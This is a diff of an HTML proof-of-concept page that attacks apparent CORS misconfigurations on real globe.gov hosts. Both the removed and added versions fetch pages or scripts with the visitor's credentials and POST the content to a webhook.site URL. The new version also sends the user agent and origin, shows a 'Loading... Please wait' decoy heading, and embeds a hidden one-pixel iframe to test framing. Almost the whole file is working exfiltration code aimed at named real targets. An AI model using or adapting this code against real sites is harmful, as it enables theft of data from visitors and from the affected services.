@@ -1,40 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>🛰️ NASA CORS Exfil PoC</title>
-  <style>
-    body { background: black; color: lime; font-family: monospace; padding: 20px; }
-    pre { white-space: pre-wrap; word-break: break-all; }
-  </style>
+  <meta charset="UTF-8">
+  <title>GLOBE.gov Attack Demo</title>
 </head>
 <body>
-  <h2>🛰️ NASA CORS Exploit - Direct from Browser</h2>
-  <pre id="output">Initializing...</pre>
+<h2>Loading... Please wait</h2>
 
-  <script>
-    const target = "https://datasearchstaging.globe.gov/";
-    const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de"; // replace with your own
-
-    fetch(target, {
-      method: "GET",
-      credentials: "include",
-      mode: "cors"
-    })
-    .then(response => response.text())
-    .then(data => {
-      document.getElementById("output").textContent = data.slice(0, 1000);
-      return fetch(webhook, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          source: target,
-          exfiltrated: data.slice(0, 5000)
-        })
-      });
-    })
-    .catch(err => {
-      document.getElementById("output").textContent = "❌ ERROR:\n" + err;
+<script>
+(async () => {
+  try {
+    // Step 1: Exploit CORS to access sensitive JS files from vis.globe.gov
+    const res1 = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js", {
+      credentials: "include"
     });
-  </script>
+    const res2 = await fetch("https://vis.globe.gov/GLOBE/javascript/purify.min.js", {
+      credentials: "include"
+    });
+
+    const data1 = await res1.text();
+    const data2 = await res2.text();
+
+    // Step 2: Exfiltrate content to attacker's Webhook
+    await fetch("https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        status: "💉 Data stolen from vis.globe.gov via CORS",
+        VISmain: data1.slice(0, 1000),
+        purify: data2.slice(0, 1000),
+        userAgent: navigator.userAgent,
+        origin: location.origin,
+        timestamp: new Date().toISOString()
+      })
+    });
+  } catch (err) {
+    console.error("Attack failed:", err);
+  }
+})();
+</script>
+
+<!-- Optional: test iframe injection due to missing X-Frame-Options -->
+<iframe src="https://vis.globe.gov/GLOBE/popUpContents.jsp" width="1" height="1" style="opacity:0;pointer-events:none"></iframe>
+
 </body>
 </html>
